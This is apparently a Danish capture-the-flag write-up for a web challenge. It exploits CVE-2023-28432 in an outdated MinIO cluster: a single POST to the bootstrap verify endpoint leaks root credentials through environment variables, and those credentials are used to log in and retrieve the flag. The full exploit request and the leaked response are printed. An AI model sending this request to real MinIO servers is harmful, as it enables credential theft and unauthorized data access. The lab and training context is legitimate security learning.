---
title: "Bootstrap Betrayal"
ctf: "DDC Qualifiers"
challenge_name: "Bootstrap Betrayal"
category: "Web"
date: 2026-03-23
tags: [ctf, writeup, Web]
status: draft
tools: []
techniques: []
vuln: ""
slug: "bootstrap-betrayal"
---

# Bootstrap Betrayal

## Challenge beskrivelse
Sheeesh jeg har lige lavet den varmeste 🔥 og første hjemmeside nogensinde, hvor man kan dele tekst med andre.  
Du skal bare sende ét link. Der er ikke så mange brugere, da det kun rigtigt er mig og få venner, der har været med til at udvikle hjemmesiden der kender hjemmesiden

MEEEEEEEEEEEEEN du kunne være den første rigtige bruger :D

Gå til `kopipasta.cfire`


## Løsning af challenge
Først loggede jeg ind og så dette:
```
En forældet MinIO-klynge kører med en kritisk sikkerhedssårbarhed.  
Din opgave er at hente flaget. GLHF!

IT-Ops-portalen er tilgængelig på http://portal.cfire:8080.
```

Dernæst Googlede jeg "miniio env var vulnerability" og fandt dette:
https://www.sentinelone.com/blog/cve-2023-28432/

I Burp Suite blev denne request kreereret: 
```
Request 
POST /minio/bootstrap/v1/verify HTTP/1.1
Host: minio.cfire:9000
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

Dette gav denne response: 

```
HTTP/1.1 200 OK
Content-Security-Policy: block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
Vary: Origin
X-Amz-Request-Id: 1897BC579DF15E9C
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Date: Thu, 26 Feb 2026 07:47:42 GMT
Content-Length: 1440
Content-Type: text/plain; charset=utf-8

{"MinioPlatform":"OS: linux | Arch: amd64","MinioEndpoints":[{"Legacy":true,"SetCount":1,"DrivesPerSet":4,"Endpoints":[{"Scheme":"http","Opaque":"","User":null,"Host":"minio.cfire:9000","Path":"/data","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio2.cfire:9000","Path":"/data","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio3.cfire:9000","Path":"/data","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio4.cfire:9000","Path":"/data","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false}],"CmdLine":"http://minio.cfire/data http://minio2.cfire/data http://minio3.cfire/data http://minio4.cfire/data"}],"MinioEnv":{"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_ROOT_PASSWORD":"X9mK2pL8vN4qR6wT3yU7zA1bC5dE","MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"admin_7h3_53cr37_k33p3r","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key","MINIO_UPDATE_MINISIGN_PUBKEY":"RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"}}
```

Jeg loggede dernæst ind med disse credentials:
```
Username: admin_7h3_53cr37_k33p3r
Password: X9mK2pL8vN4qR6wT3yU7zA1bC5dE
```

Bucket'en blev dernæst checket og browsede "dokumenter" og fandt flag.txt

Dette gav flaget: 
DDC{pwn3d_m1n10_3nvs_v4r14bl3s}

